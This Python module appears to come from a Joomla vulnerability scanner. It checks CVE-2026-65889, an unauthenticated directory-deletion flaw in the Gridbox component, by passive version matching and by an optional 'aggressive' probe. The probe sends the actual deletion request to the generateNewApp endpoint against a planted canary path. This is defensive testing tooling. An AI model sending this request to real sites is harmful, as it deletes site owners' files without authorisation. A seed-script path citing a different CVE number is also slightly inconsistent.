from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65889"
NAME = "Gridbox unauthenticated recursive directory deletion"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
DELETE_PATH = "/index.php?option=com_gridbox&task=editor.generateNewApp&name="
CANARY_PATH = "/tmp/{canary}/sub/marker.txt"


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    canary: str = "gb-delete-canary",
    marker: str = "GB_DELETE_CANARY",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    marker_path = CANARY_PATH.format(canary=canary)
    before = client.get(f"{base}{marker_path}", timeout=timeout)
    before_hit = marker in (before.get("body", "") or "")
    if not before_hit:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{DELETE_PATH}{canary}",
            detail=(
                f"The lab canary {marker_path} was not readable before the test, so the deletion "
                "could not be proven. Plant the canary with the lab seed first."
            ),
            action="Run labs/cve-2026-61425/seed.ps1, then retry.",
        )
    trigger = client.get(f"{base}{DELETE_PATH}{canary}", timeout=timeout)
    after = client.get(f"{base}{marker_path}", timeout=timeout)
    after_hit = marker in (after.get("body", "") or "")
    evidence: dict[str, object] = {
        "canary": canary,
        "marker_before": before_hit,
        "delete_status": trigger.get("status"),
        "delete_body": (trigger.get("body", "") or "")[:40],
        "marker_after": after_hit,
    }
    if not after_hit:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{DELETE_PATH}{canary}",
            evidence=evidence,
            detail=(
                f"An unauthenticated request to generateNewApp removed the nested canary directory "
                f"tmp/{canary}/sub, including marker.txt, without any session or token. "
                "The method recreates the top directory with fields.json afterwards; the nested "
                "content is gone."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later (the unauthenticated method was removed) and "
                "review writable directories for missing content."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{DELETE_PATH}{canary}",
        evidence=evidence,
        detail="The canary marker survived the deletion request.",
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify the unauthenticated generateNewApp delete path.",
        patched_detail="The unauthenticated generateNewApp method was removed in 2.20.2.",
        action="Upgrade Gridbox to 2.20.2 or later.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only canary deletion proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Arbitrary File Deletion",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65889",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
